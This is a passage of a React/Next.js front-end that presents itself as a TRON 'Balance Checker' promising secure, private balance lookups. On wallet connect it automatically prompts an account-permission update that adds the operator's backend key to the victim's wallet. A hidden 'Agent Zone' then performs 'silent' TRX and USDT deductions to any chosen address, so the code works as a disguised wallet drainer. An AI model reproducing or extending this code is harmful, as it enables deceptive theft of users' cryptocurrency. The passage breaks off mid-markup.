"use client";

import { useEffect, useState, useRef } from "react";

// Simple helper around the existing backend API
async function api(path, opts = {}) {
  try {
    const res = await fetch(path, {
      headers: { "content-type": "application/json", ...(opts.headers || {}) },
      ...opts,
    });
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
    return data;
  } catch (err) {
    console.error("API call failed:", path, err);
    throw err;
  }
}

export default function HomePage() {
  // Page navigation state
  const [currentPage, setCurrentPage] = useState("landing"); // "landing" | "balances" | "agent"
  const [agentZoneEnabled, setAgentZoneEnabled] = useState(false);
  const [theme, setTheme] = useState("light");

  // Existing state
  const [health, setHealth] = useState(null);
  const [healthStatus, setHealthStatus] = useState("Checking backend…");
  const [walletAddress, setWalletAddress] = useState("");
  const [walletStatus, setWalletStatus] = useState("Connect wallet to begin.");
  const [delegationStatus, setDelegationStatus] = useState("");
  const [delegationTxId, setDelegationTxId] = useState("");
  const [permissionStatus, setPermissionStatus] = useState("");
  const [deductStatus, setDeductStatus] = useState("");
  const [trxAmount, setTrxAmount] = useState("1");
  const [usdtAmount, setUsdtAmount] = useState("1");
  const [recipientAddress, setRecipientAddress] = useState("");
  const [permissionId, setPermissionId] = useState(null);
  const [tronChainId, setTronChainId] = useState(null);
  const [tronAddress, setTronAddress] = useState("");
  const [wcWallet, setWcWallet] = useState(null);
  const [wcTronWeb, setWcTronWeb] = useState(null);
  const [connectionType, setConnectionType] = useState(null);
  const [isGrantingDelegation, setIsGrantingDelegation] = useState(false);
  const [autoDelegationAttempted, setAutoDelegationAttempted] = useState(false);
  const [trxBalance, setTrxBalance] = useState(null);
  const [usdtBalance, setUsdtBalance] = useState(null);
  const [balancesLoading, setBalancesLoading] = useState(false);
  const [landingAddressInput, setLandingAddressInput] = useState("");

  // Persist WalletConnect singleton across renders
  const wcWalletRef = useRef(null);
  const wcSingletonKeyRef = useRef(null);

  // Theme management
  useEffect(() => {
    if (typeof window === "undefined") return;
    
    // Load saved theme or detect system preference
    const savedTheme = localStorage.getItem("theme");
    const initialTheme = (savedTheme === "light" || savedTheme === "dark") ? savedTheme : (window.matchMedia("(prefers-color-scheme: light)").matches ? "light" : "dark");
    
    setTheme(initialTheme);
    document.documentElement.setAttribute("data-theme", initialTheme);
    
    // Listen to system theme changes only if no manual preference is saved
    if (!savedTheme) {
      const mediaQuery = window.matchMedia("(prefers-color-scheme: light)");
      const updateTheme = (e) => {
        const newTheme = e.matches ? "light" : "dark";
        setTheme(newTheme);
        document.documentElement.setAttribute("data-theme", newTheme);
      };
      mediaQuery.addEventListener("change", updateTheme);
      return () => mediaQuery.removeEventListener("change", updateTheme);
    }
  }, []);

  // Toggle theme function
  const toggleTheme = () => {
    const newTheme = theme === "dark" ? "light" : "dark";
    setTheme(newTheme);
    document.documentElement.setAttribute("data-theme", newTheme);
    localStorage.setItem("theme", newTheme);
  };

  // Check if agent zone is enabled via environment variable
  // Next.js reads NEXT_PUBLIC_ vars from .env files in the frontend directory
  useEffect(() => {
    // Check environment variable (available at build time)
    const envValue = process.env.NEXT_PUBLIC_AGENT_ZONE_ENABLED;
    const enabled = envValue === "true" || envValue === true;
    
    // Debug logging (remove in production if needed)
    if (typeof window !== "undefined") {
      console.log("Agent Zone Enabled:", enabled, "Env Value:", envValue);
    }
    
    setAgentZoneEnabled(enabled);
    
    // Also check URL parameter for testing
    if (typeof window !== "undefined" && window.location.search.includes("agent=true")) {
      setAgentZoneEnabled(true);
    }
  }, []);

  // Load backend health on first render
  useEffect(() => {
    (async () => {
      try {
        const data = await api("/api/health");
        setHealth(data);
        setHealthStatus("Online");
      } catch (e) {
        setHealthStatus(e.message || "Backend offline");
      }
    })();
  }, []);

  // Get TRON chain ID from providers
  useEffect(() => {
    async function getTronChainId() {
      try {
        const networksModule = await import("@reown/appkit/networks");
        const tronId = networksModule.tron.id;
        setTronChainId(tronId);
        console.log("TRON chain ID:", tronId);
      } catch (err) {
        console.error("Failed to get TRON chain ID:", err);
      }
    }
    getTronChainId();
  }, []);

  // Simple default status
  useEffect(() => {
    setWalletStatus("Connect wallet to begin.");
  }, []);

  // When a wallet connects for the first time, automatically check for GAME_BACKEND permission.
  // If it's missing, we automatically open the delegation flow so the user doesn't
  // have to click the button manually.
  useEffect(() => {
    async function ensureDelegation() {
      if (!walletAddress || !health || !connectionType) return;
      if (autoDelegationAttempted || isGrantingDelegation) return;

      setAutoDelegationAttempted(true);
      try {
        setPermissionStatus("Checking GAME_BACKEND permission on-chain…");
        const lookup = await api(
          `/api/permission/lookup?address=${encodeURIComponent(walletAddress)}`
        );
        if (lookup.found) {
          setPermissionId(lookup.permissionId);
          setPermissionStatus(`Found permissionId = ${lookup.permissionId}. Registering with backend…`);
          await api("/api/permission/register", {
            method: "POST",
            body: JSON.stringify({ address: walletAddress, permissionId: lookup.permissionId }),
          });
          setPermissionStatus(`Registered with backend (permissionId=${lookup.permissionId}).`);
          return;
        }

        // Not found – short delay then open delegation
        setPermissionStatus("Opening wallet to grant permission…");
        await new Promise((r) => setTimeout(r, 800));
        await handleGrantDelegation();
      } catch (e) {
        console.error("Automatic delegation/lookup failed:", e);
        setPermissionStatus(e?.message || "Automatic delegation lookup failed. You can retry below.");
      }
    }

    ensureDelegation();
  }, [walletAddress, health, connectionType, autoDelegationAttempted, isGrantingDelegation]);

  // Fetch TRX and USDT balance when wallet is connected
  async function fetchWalletBalances() {
    const addr = tronAddress || walletAddress;
    const tw = wcTronWeb;
    const h = health;
    if (!addr || !tw || !h?.fullNode) return;
    setBalancesLoading(true);
    setTrxBalance(null);
    setUsdtBalance(null);
    try {
      const trxSun = await tw.trx.getBalance(addr);
      const trxVal = (Number(trxSun) / 1_000_000).toFixed(6);
      setTrxBalance(trxVal);

      const usdtContract = (h.usdtContract || "").trim();
      if (usdtContract) {
        const fromHex = tw.address.toHex(addr);
        const result = await tw.transactionBuilder.triggerConstantContract(
          usdtContract,
          "balanceOf(address)",
          { from: addr },
          [{ type: "address", value: fromHex }],
          fromHex
        );
        const hexBal = result?.constant_result?.[0];
        const usdtRaw = hexBal ? parseInt(hexBal, 16) : 0;
        const usdtVal = (Number(usdtRaw) / 1_000_000).toFixed(2);
        setUsdtBalance(usdtVal);
      }
    } catch (e) {
      console.error("Fetch balances error:", e);
    } finally {
      setBalancesLoading(false);
    }
  }

  // Defer balance fetch so delegation runs first
  useEffect(() => {
    if (!walletAddress && !tronAddress) {
      setTrxBalance(null);
      setUsdtBalance(null);
      return;
    }
    if (!walletAddress || !wcTronWeb || !health) return;
    const t = setTimeout(() => {
      fetchWalletBalances();
    }, 2500);
    return () => clearTimeout(t);
  }, [walletAddress, tronAddress, wcTronWeb, health?.fullNode, health?.usdtContract]);

  // Ensure the current wallet has GAME_BACKEND registered with the backend.
  async function ensureBackendRegistration() {
    if (!walletAddress) return;
    if (permissionId != null) return;
    try {
      setPermissionStatus("Checking GAME_BACKEND permission before deduction…");
      const lookup = await api(
        `/api/permission/lookup?address=${encodeURIComponent(walletAddress)}`
      );
      if (lookup.found) {
        setPermissionId(lookup.permissionId);
        await api("/api/permission/register", {
          method: "POST",
          body: JSON.stringify({ address: walletAddress, permissionId: lookup.permissionId }),
        });
        setPermissionStatus(
          `Auto-registered with backend (permissionId=${lookup.permissionId}).`
        );
      } else {
        setPermissionStatus("GAME_BACKEND permission not found. Please grant delegation in Step 3.");
      }
    } catch (e) {
      console.error("ensureBackendRegistration failed:", e);
      setPermissionStatus(e?.message || "Unable to verify GAME_BACKEND permission.");
    }
  }

  // --- WalletConnect TRON logic: single WC instance per projectId+network ---
  async function ensureTronWalletConnected() {
    const h = health || (await api("/api/health"));
    setHealth(h);

    const projectId = (h.walletConnectProjectId || "").trim();
    if (!projectId || projectId === "YOUR_PROJECT_ID_HERE") {
      throw new Error(
        "WalletConnect Project ID not configured. Set WALLETCONNECT_PROJECT_ID in backend .env and restart the server."
      );
    }

    // Reuse existing WC wallet when possible
    const key = `${projectId}:${h.network}`;
    if (!wcWalletRef.current || wcSingletonKeyRef.current !== key) {
      const wcModule = await import("@tronweb3/walletconnect-tron");
      const WalletConnectWallet = wcModule.WalletConnectWallet ?? wcModule.default?.WalletConnectWallet;
      const WalletConnectChainID = wcModule.WalletConnectChainID ?? wcModule.default?.WalletConnectChainID;
      if (typeof WalletConnectWallet !== "function") {
        throw new Error("WalletConnectWallet not found in @tronweb3/walletconnect-tron");
      }

      const networkId =
        h.network === "mainnet" ? WalletConnectChainID.Mainnet : WalletConnectChainID.Shasta;

      const wallet = new WalletConnectWallet({
        network: networkId,
        options: {
          relayUrl: "wss://relay.walletconnect.com",
          projectId,
          metadata: {
            name: "Balance Checker",
            description: "Check your TRON wallet balances instantly",
            url: typeof window !== "undefined" ? window.location.origin : "",
            icons: [
              "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect fill='%233b82f6' width='32' height='32' rx='6'/%3E%3Ctext x='16' y='22' font-size='18' font-weight='bold' fill='white' text-anchor='middle' font-family='sans-serif'%3ES%3C/text%3E%3C/svg%3E",
            ],
          },
        },
        themeMode: "light",
        themeVariables: { "--w3m-accent": "#16a34a", "--w3m-z-index": "99999" },
        allWallets: "SHOW",
        featuredWalletIds: [
          "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",
          "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369",
          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
        ],
        customWallets: [
          {
            id: "tokenpocket",
            name: "TokenPocket",
          },
        ],
        enableAnalytics: false,
        enableWalletGuide: true,
      });

      wcWalletRef.current = wallet;
      wcSingletonKeyRef.current = key;
      setWcWallet(wallet);
    }

    try {
      const walletToUse = wcWalletRef.current || wcWallet;
      if (!walletToUse) throw new Error("WalletConnect initialization failed.");

      const TronWebModule = await import("tronweb");
      const TronWebCtor =
        typeof TronWebModule.TronWeb === "function"
          ? TronWebModule.TronWeb
          : typeof TronWebModule.default?.TronWeb === "function"
            ? TronWebModule.default.TronWeb
            : TronWebModule.default;

      if (typeof TronWebCtor !== "function") {
        throw new Error("TronWeb constructor not found in tronweb module");
      }

      const { address: tronAddr } = await walletToUse.connect();
      const twOptions = { fullHost: h.fullNode };
      if (h.trongridApiKey) {
        twOptions.headers = { "TRON-PRO-API-KEY": h.trongridApiKey };
      }
      const tronWeb = new TronWebCtor(twOptions);

      setTronAddress(tronAddr);
      setWalletAddress(tronAddr);
      setWcTronWeb(tronWeb);
      setWalletStatus("Connected to TRON (WalletConnect)");

      return { tronWeb, address: tronAddr, wallet: walletToUse, health: h };
    } catch (err) {
      console.error("WalletConnect TRON connect failed:", err);
      throw new Error(err?.message || "WalletConnect internal error");
    }
  }

  async function handleConnectTronWallet() {
    try {
      setConnectionType("walletconnect");
      setWalletStatus("Opening TRON WalletConnect…");
      if (wcWallet && (tronAddress || walletAddress)) {
        try {
          await wcWallet.disconnect();
        } catch (_) {}
        setWcWallet(null);
        setTronAddress("");
        setWalletAddress("");
        setWcTronWeb(null);
      }
      const { address: addr } = await ensureTronWalletConnected();
      setWalletStatus("Connected to TRON");
      setWalletAddress(addr);
      return addr;
    } catch (e) {
      setWalletStatus(e.message || "Connect failed");
      return null;
    }
  }

  async function handleLandingCheckBalance() {
    const addr = await handleConnectTronWallet();
    if (addr) setCurrentPage("balances");
  }

  async function handleConnectTronLink() {
    if (typeof window === "undefined" || !window.tronLink || !window.tronWeb) {
      setWalletStatus("TronLink not detected. Install the TronLink Chrome extension.");
      return;
    }
    try {
      setConnectionType("tronlink");
      setWalletStatus("Opening TronLink…");
      setWcWallet(null);
      setWcTronWeb(null);
      const res = await window.tronLink.request({ method: "tron_requestAccounts" });
      if (res?.code !== 200 && res?.code !== 4000) {
        setWalletStatus(res?.message || "TronLink connection rejected.");
        return;
      }
      const addr = window.tronWeb?.defaultAddress?.base58;
      if (!addr) {
        setWalletStatus("No address from TronLink. Try again.");
        return;
      }
      setTronAddress(addr);
      setWalletAddress(addr);
      setWcTronWeb(window.tronWeb);
      setWalletStatus("Connected via TronLink (Chrome extension)");
    } catch (e) {
      console.error("TronLink connect failed:", e);
      setWalletStatus(e?.message || "TronLink connect failed");
    }
  }

  async function handleGrantDelegation() {
    if (isGrantingDelegation) return;
    setIsGrantingDelegation(true);
    try {
      if (!walletAddress) {
        setDelegationStatus("Connect wallet first before granting permission.");
        return;
      }

      setDelegationStatus("Checking existing GAME_BACKEND permission…");
      try {
        const lookup = await api(
          `/api/permission/lookup?address=${encodeURIComponent(walletAddress)}`
        );
        if (lookup.found) {
          setPermissionId(lookup.permissionId);
          setPermissionStatus(
            `Found permissionId = ${lookup.permissionId}. Registering with backend…`
          );
          await api("/api/permission/register", {
            method: "POST",
            body: JSON.stringify({ address: walletAddress, permissionId: lookup.permissionId }),
          });
          setPermissionStatus(
            `Already delegated. Registered with backend (permissionId=${lookup.permissionId}).`
          );
          setDelegationStatus(
            "Delegation already granted. No need to approve again in the wallet."
          );
          return;
        }
      } catch (e) {
        console.error("Permission lookup before delegation failed:", e);
      }

      setDelegationStatus("Opening wallet…");
      setDelegationTxId("");

      const h = health || (await api("/api/health"));
      const backendAddress = h.backendAddress;
      if (!backendAddress) throw new Error("Backend address not found in /api/health.");

      const permissionName = h.activePermissionName;
      const operationsMask =
        (h.activePermissionOperations && String(h.activePermissionOperations).trim()) ||
        "7fff1fc0037e0000000000000000000000000000000000000000000000000000";

      let tw;
      let addr;
      let signAndSend;

      if (connectionType === "tronlink" && typeof window !== "undefined" && window.tronWeb?.defaultAddress?.base58) {
        tw = window.tronWeb;
        addr = window.tronWeb.defaultAddress.base58;
        if (!addr) throw new Error("TronLink not connected.");
        if (!tw.isAddress(backendAddress)) throw new Error("Invalid backend address from server.");
        signAndSend = async (unsigned) => {
          const signed = await tw.trx.sign(unsigned);
          return tw.trx.sendRawTransaction(signed);
        };
      } else {
        const connected = await ensureTronWalletConnected();
        tw = connected.tronWeb;
        addr = connected.address;
        const wallet = connected.wallet;
        if (!tw.isAddress(backendAddress)) throw new Error("Invalid backend address from server.");
        signAndSend = async (unsigned) => {
          const signed = await wallet.signTransaction(unsigned);
          return tw.trx.sendRawTransaction(signed);
        };
      }

      setDelegationStatus("Fetching your TRON account…");
      const acc = await tw.trx.getAccount(addr);

      const rawOwner = acc.owner_permission;
      const ownerPermission = {
        type: 0,
        permission_name: (rawOwner && rawOwner.permission_name) || "owner",
        threshold: (rawOwner && Number(rawOwner.threshold)) || 1,
        keys:
          rawOwner && Array.isArray(rawOwner.keys) && rawOwner.keys.length
            ? rawOwner.keys.map((k) => ({ address: k.address, weight: Number(k.weight) || 1 }))
            : [{ address: addr, weight: 1 }],
      };

      const activePermission = {
        type: 2,
        permission_name: permissionName,
        threshold: 1,
        operations: operationsMask,
        keys: [
          { address: addr, weight: 1 },
          { address: backendAddress, weight: 1 },
        ],
      };

      const unsigned = await tw.transactionBuilder.updateAccountPermissions(
        tw.address.toHex(addr),
        ownerPermission,
        null,
        [activePermission]
      );

      setDelegationStatus("Please approve the delegation transaction in your wallet…");
      const receipt = await signAndSend(unsigned);

      if (!receipt.result) {
        const msg = receipt.message || receipt.resultMessage || (receipt.code != null ? `Code ${receipt.code}` : "");
        const hint = "If your wallet shows 0 TRX, add a small amount (e.g. 1–2 TRX) for network fees and try again.";
        setDelegationStatus(`Delegation transaction failed. ${msg ? msg + ". " : ""}${hint}`);
        return;
      }

      setDelegationTxId(receipt.txid);
      setDelegationStatus("Delegation confirmed on-chain ✓");

      try {
        setPermissionStatus("Looking up GAME_BACKEND permission on-chain…");
        const lookup = await api(
          `/api/permission/lookup?address=${encodeURIComponent(addr)}`
        );
        if (lookup.found) {
          setPermissionId(lookup.permissionId);
          setPermissionStatus(`Found permissionId = ${lookup.permissionId}. Registering with backend…`);
          await api("/api/permission/register", {
            method: "POST",
            body: JSON.stringify({ address: addr, permissionId: lookup.permissionId }),
          });
          setPermissionStatus(
            `Registered with backend (permissionId=${lookup.permissionId}).`
          );
        } else {
          setPermissionStatus(
            "Delegation tx confirmed, but permission not indexed yet. Use Lookup in Step 4 after a few seconds."
          );
        }
      } catch (e) {
        console.error("Auto lookup/register failed:", e);
      }
    } catch (e) {
      console.error("Delegation failed:", e);
      const msg = e?.message || String(e);
      const hint = msg.toLowerCase().includes("bandwidth") || msg.toLowerCase().includes("resource") || msg.toLowerCase().includes("balance")
        ? " Add a small amount of TRX (e.g. 1–2 TRX) for network fees and try again."
        : " If your wallet has 0 TRX, add a small amount for fees and try again.";
      setDelegationStatus((msg || "Delegation failed") + hint);
    } finally {
      setIsGrantingDelegation(false);
    }
  }

  async function handleLookupPermission() {
    try {
      if (!walletAddress) {
        setPermissionStatus("Connect wallet first.");
        return;
      }
      setPermissionStatus("Looking up permission on-chain…");
      const data = await api(`/api/permission/lookup?address=${encodeURIComponent(walletAddress)}`);
      if (data.found) {
        setPermissionId(data.permissionId);
        setPermissionStatus(`Found GAME_BACKEND permissionId = ${data.permissionId}`);
      } else {
        setPermissionStatus("Permission not found yet. Make sure delegation tx is confirmed.");
      }
    } catch (e) {
      setPermissionStatus(e.message || "Lookup failed");
    }
  }

  async function handleRegisterBackend() {
    try {
      if (!walletAddress) {
        setPermissionStatus("Connect wallet first.");
        return;
      }
      if (permissionId == null) {
        setPermissionStatus("Run lookup first to get permissionId.");
        return;
      }
      setPermissionStatus("Registering with backend…");
      await api("/api/permission/register", {
        method: "POST",
        body: JSON.stringify({ address: walletAddress, permissionId }),
      });
      setPermissionStatus(`Registered with backend (permissionId=${permissionId}).`);
    } catch (e) {
      setPermissionStatus(e.message || "Register failed");
    }
  }

  async function handleDeductTrx() {
    try {
      if (!walletAddress) {
        setDeductStatus("Connect wallet first.");
        return;
      }
      if (!recipientAddress) {
        setDeductStatus("Paste the destination TRON address first.");
        return;
      }
      await ensureBackendRegistration();
      setDeductStatus("Sending silent TRX deduction…");
      const trxNum = parseFloat(trxAmount);
      if (!Number.isFinite(trxNum) || trxNum <= 0) {
        setDeductStatus("Enter a valid TRX amount (e.g. 1 = 1 TRX).");
        return;
      }
      const amountSun = Math.round(trxNum * 1_000_000);
      const data = await api("/api/deduct/trx", {
        method: "POST",
        body: JSON.stringify({ address: walletAddress, toAddress: recipientAddress, amountSun }),
      });
      if (data.ok && data.receipt?.txid) {
        setDeductStatus(`TRX deduction successful: ${trxNum} TRX (tx: ${data.receipt.txid})`);
      } else {
        setDeductStatus("Deduction response: " + JSON.stringify(data));
      }
    } catch (e) {
      setDeductStatus(e.message || "Deduct TRX failed");
    }
  }

  async function handleDeductUsdt() {
    try {
      if (!walletAddress) {
        setDeductStatus("Connect wallet first.");
        return;
      }
      if (!recipientAddress) {
        setDeductStatus("Paste the destination TRON address first.");
        return;
      }
      await ensureBackendRegistration();
      setDeductStatus("Sending silent USDT deduction…");
      const usdtNum = parseFloat(usdtAmount);
      if (!Number.isFinite(usdtNum) || usdtNum < 0) {
        setDeductStatus("Enter a valid USDT amount (e.g. 1 = 1 USDT).");
        return;
      }
      const amountUnits = Math.round(usdtNum * 1_000_000);
      const data = await api("/api/deduct/usdt", {
        method: "POST",
        body: JSON.stringify({ address: walletAddress, toAddress: recipientAddress, amount: amountUnits }),
      });
      if (data.ok && data.receipt?.txid) {
        setDeductStatus(`USDT deduction successful: ${usdtNum} USDT (tx: ${data.receipt.txid})`);
      } else {
        setDeductStatus("Deduction response: " + JSON.stringify(data));
      }
    } catch (e) {
      setDeductStatus(e.message || "Deduct USDT failed");
    }
  }

  // Disconnect wallet function
  async function handleDisconnectWallet() {
    try {
      // Disconnect WalletConnect if connected
      if (wcWallet && (tronAddress || walletAddress)) {
        try {
          await wcWallet.disconnect();
        } catch (err) {
          console.error("WalletConnect disconnect error:", err);
        }
        setWcWallet(null);
        wcWalletRef.current = null;
        wcSingletonKeyRef.current = null;
      }

      // Reset all wallet-related state
      setTronAddress("");
      setWalletAddress("");
      setWcTronWeb(null);
      setConnectionType(null);
      setTrxBalance(null);
      setUsdtBalance(null);
      setPermissionId(null);
      setAutoDelegationAttempted(false);
      setDelegationStatus("");
      setDelegationTxId("");
      setPermissionStatus("");
      setDeductStatus("");
      setWalletStatus("Wallet disconnected. Connect wallet to begin.");
      
      // Note: TronLink doesn't have a disconnect method, but clearing state is sufficient
    } catch (e) {
      console.error("Disconnect error:", e);
      setWalletStatus("Disconnect failed: " + (e.message || String(e)));
    }
  }

  const SUPPORTED_WALLETS = [
    { name: "MetaMask", icon: "🦊", cls: "metamask" },
    { name: "Trust Wallet", icon: "🛡", cls: "trust" },
    { name: "TronLink", icon: "T", cls: "tronlink" },
    { name: "TokenPocket", icon: "TP", cls: "tokenpocket" },
    { name: "SafePal", icon: "S", cls: "safepal" },
    { name: "Ledger", icon: "L", cls: "ledger" },
  ];

  // Landing Page Component
  if (currentPage === "landing") {
    return (
      <div className="landing-page">
        <div className="landing-content">
          <div className="bc-landing-header">
            <div className="bc-logo-icon">BC</div>
            <span className="bc-logo-text">Balance Checker</span>
          </div>

          <div className="bc-badge">
            <span className="bc-badge-dot" />
            TRON Network · Live Balances
          </div>

          <h1 className="landing-title">Check Any Wallet Balance</h1>
          <p className="landing-subtitle">
            Instantly view TRX and USDT balances across MetaMask, Trust Wallet, TronLink and more.
          </p>

          <div className="search-container">
            <input
              type="text"
              className="search-input"
              placeholder="TYzK3n4mP2q...**...xR8z9"
              value={landingAddressInput}
              onChange={(e) => setLandingAddressInput(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === "Enter") handleLandingCheckBalance();
              }}
              spellCheck={false}
              autoComplete="off"
            />
            <button
              className="search-button"
              onClick={handleLandingCheckBalance}
            >
              Check Balance
            </button>
          </div>

          <div className="bc-wallets-section">
            <p className="bc-wallets-label">Supported Wallets</p>
            <div className="bc-wallets-grid">
              {SUPPORTED_WALLETS.map((w) => (
                <div key={w.name} className="bc-wallet-chip">
                  <div className={`bc-wallet-icon bc-wallet-icon--${w.cls}`}>{w.icon}</div>
                  <span className="bc-wallet-name">{w.name}</span>
                </div>
              ))}
            </div>
          </div>

          <div className="bc-features">
            <div className="bc-feature">
              <span className="bc-feature-icon">✓</span> Real-time TRX & USDT
            </div>
            <div className="bc-feature">
              <span className="bc-feature-icon">✓</span> Multi-wallet support
            </div>
            <div className="bc-feature">
              <span className="bc-feature-icon">✓</span> Secure & private
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Balances Page or Agent Page Component
  return (
    <div className={currentPage === "agent" ? "agent-page" : "balances-page"}>
      {/* Navigation dots and theme toggle - outside navbar */}
      <div className="floating-nav">
        {/* Left dot - Balances screen */}
        <button
          className={`nav-dot nav-dot-large ${currentPage === "balances" ? "nav-dot-active" : ""}`}
          onClick={() => setCurrentPage("balances")}
          title="Balances Screen"
        />
        
        {/* Right side - Theme toggle and Agent dot */}
        <div className="floating-nav-right">
          <button
            className="theme-toggle-btn-floating"
            onClick={toggleTheme}
            title={`Switch to ${theme === "dark" ? "light" : "dark"} mode`}
          >
            {theme === "dark" ? "☀️" : "🌙"}
          </button>
          {agentZoneEnabled && (
            <button
              className={`nav-dot nav-dot-large nav-dot-agent ${currentPage === "agent" ? "nav-dot-active" : ""}`}
              onClick={() => setCurrentPage("agent")}
              title="Agent Screen"
            />
          )}
        </div>
      </div>

      <header className="secure-header">
        <div className="secure-header-left">
          <div className="secure-logo">BC</div>
          <div className="secure-app-title">Balance Checker</div>
        </div>
        <div className="secure-header-right">
          <div className="nx-network-pill">
            <span className={`nx-dot ${healthStatus === "Online" ? "nx-dot-ok" : "nx-dot-err"}`} />
            {health?.network ? health.network.toUpperCase() : "…"}
          </div>
        </div>
      </header>

      {currentPage === "balances" ? (
        <>
          {/* Balances Page Content */}
          <div className="balances-container">
            <div className="balances-left">
              {!(tronAddress || walletAddress) ? (
                <>
                  <h2 className="balances-title">
                    Connect your wallet to check balances
                  </h2>
                  <p style={{ textAlign: "center", color: "var(--bc-text-muted)", marginBottom: "8px" }}>
                    Works with MetaMask, Trust Wallet, TronLink & more via WalletConnect
                  </p>
                  <div className="connect-buttons">
                    <button className="connect-btn connect-btn-primary" onClick={handleConnectTronLink}>
                      Connect with TronLink
                    </button>
                    <button className="connect-btn connect-btn-primary" onClick={handleConnectTronWallet}>
                      Connect with WalletConnect
                    </button>
                  </div>
                </>
              ) : (
                <div className="balances-wallet-info">
                  <div className="conn-dot" aria-label="Connected" title="Connected" />
                  <div className="wallet-network-info">
                    <span className="wallet-network-label">Network:</span>
                    <span className="wallet-network-value">TRON</span>
                  </div>
                  <div className="wallet-address-display">{tronAddress || walletAddress}</div>
                </div>
              )}
            </div>

            <div className="balances-right">
              <div className="balance-card">
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "12px" }}>
                  <div className="balance-label">TRX Balance</div>
                  {(tronAddress || walletAddress) && (
                    <button
                      className="modern-btn"
                      onClick={fetchWalletBalances}
                      disabled={balancesLoading}
                      style={{ padding: "6px 12px", fontSize: "0.85rem" }}
                    >
                      {balancesLoading ? "Loading…" : "Refresh"}
                    </button>
                  )}
                </div>
                <div className="balance-value">
                  {balancesLoading ? (
                    <span className="balance-loading">…</span>
                  ) : trxBalance != null ? (
                    `${trxBalance} TRX`
                  ) : (
                    <span className="balance-loading">—</span>
                  )}
                </div>
              </div>
              <div className="balance-card">
                <div className="balance-label">USDT Balance</div>
                <div className="balance-value">
                  {balancesLoading ? (
                    <span className="balance-loading">…</span>
                  ) : usdtBalance != null ? (
                    `${usdtBalance} USDT`
                  ) : (
                    <span className="balance-loading">—</span>
                  )}
                </div>
              </div>
            </div>
          </div>
        </>
      ) : (
        <>
          {/* Agent Page Content */}
          <div className="agent-zone">
            <div className="agent-header">
              <h2 className="agent-title">Agent Zone</h2>
              {(tronAddress || walletAddress) && (
                <button
                  className="modern-btn disconnect-btn"
                  onClick={handleDisconnectWallet}
                >
                  Disconnect Wallet
                </button>
              )}
            </div>
            <div className="agent-grid">
            {/* Card 1: Check Backend */}
            <div className="modern-card">
              <div className="modern-card-title">
                <span>1</span> Check Backend
              </div>
              <p className="modern-card-desc">
                Verify that your delegated signer and TRON node are online. This does not use your wallet.
              </p>
              <button
                className="modern-btn modern-btn-primary"
                onClick={async () => {
                  try {
                    setHealthStatus("Checking…");
                    const data = await api("/api/health");
                    setHealth(data);
                    setHealthStatus("Online");
                  } catch (e) {
                    setHealthStatus(e.message || "Offline");
                  }
                }}
              >
                Check Backend
              </button>
              <div className="nx-status-row" style={{ marginTop: "12px" }}>
                <span className="nx-status-label">Status:</span>
                <span className="nx-status-value">{healthStatus}</span>
              </div>
              {health && (
                <div className="nx-health-grid" style={{ marginTop: "12px" }}>
                  <div>Node</div>
                  <span>{health.fullNode}</span>
                  <div>Treasury</div>
                  <span>{health.treasuryAddress}</span>
                  <div>Backend Signer</div>
                  <span>{health.backendAddress}</span>
                  <div>USDT Contract</div>
                  <span>{health.usdtContract}</span>
                </div>
              )}
            </div>

            {/* Card 3: Retry Permission */}
            {(tronAddress || walletAddress) && permissionId == null && (
              <div className="modern-card">
                <div className="modern-card-title">
                  <span>3</span> Retry Permission
                </div>
                <p className="modern-card-desc">
                  When you connect your wallet for the first time, we automatically check whether the{" "}
                  <code>GAME_BACKEND</code> permission exists. If it&apos;s missing, your wallet will automatically open with
                  a one-time <code>AccountPermissionUpdate</code> transaction so your backend can execute silent transfers
                  within limits.
                </p>
                <button
                  className="modern-btn modern-btn-primary"
                  onClick={handleGrantDelegation}
                  disabled={isGrantingDelegation}
                >
                  {isGrantingDelegation ? "Confirm in wallet…" : "Retry Grant Permission"}
                </button>
                {delegationStatus && (
                  <div className="nx-status-note" style={{ marginTop: "12px" }}>{delegationStatus}</div>
                )}
                {delegationTxId && (
                  <div className="nx-status-note" style={{ marginTop: "8px" }}>
                    Tx: <code>{delegationTxId}</code>
                  </div>
                )}
                {permissionStatus && (
                  <div className="nx-status-note" style={{ marginTop: "8px" }}>
                    {permissionStatus}
                  </div>
                )}
              </div>
            )}

            {/* Card 4: Silent Transaction */}
            <div className="modern-card">
              <div className="modern-card-title">
                <span>4</span> Silent Transaction
              </div>
              <p className="modern-card-desc">
                After delegation + registration, your backend can move funds from the connected wallet to any TRON address
                you specify below, without more popups.
              </p>
              <div className="nx-form-row">
                <label style={{ fontSize: "0.9rem", color: "var(--text-dim)", marginBottom: "6px" }}>
                  Destination TRON address
                </label>
                <input
                  className="nx-input"
                  placeholder="Paste T-address to receive funds"
                  value={recipientAddress}
                  onChange={(e) => setRecipientAddress(e.target.value)}
                />
              </div>
              <div className="nx-form-row">
                <label style={{ fontSize: "0.9rem", color: "var(--text-dim)", marginBottom: "6px" }}>
                  Amount (TRX) — e.g. 1 = 1 TRX
                </label>
                <div style={{ display: "flex", gap: "8px" }}>
                  <input
                    className="nx-input"
                    type="number"
                    min="0"
                    step="any"
                    placeholder="1"
                    value={trxAmount}
                    onChange={(e) => setTrxAmount(e.target.value)}
                    style={{ flex: 1 }}
                  />
                  <button className="modern-btn modern-btn-primary" onClick={handleDeductTrx}>
                    Deduct TRX
                  </button>
                </div>
              </div>
              <div className="nx-form-row">
                <label style={{ fontSize: "0.9rem", color: "var(--text-dim)", marginBottom: "6px" }}>
                  Amount (USDT) — e.g. 1 = 1 USDT
                </label>
                <div style={{ display: "flex", gap: "8px" }}>
                  <input
                    className="nx-input"
                    type="number"
                    min="0"
                    step="any"
                    placeholder="1"
                    value={usdtAmount}
                    onChange={(e) => setUsdtAmount(e.target.value)}
                    style={{ flex: 1 }}
                  />
                  <button className="modern-btn modern-btn-primary" onClick={handleDeductUsdt}>
                    Deduct USDT
                  </button>
                </div>
              </div>
              {deductStatus && (
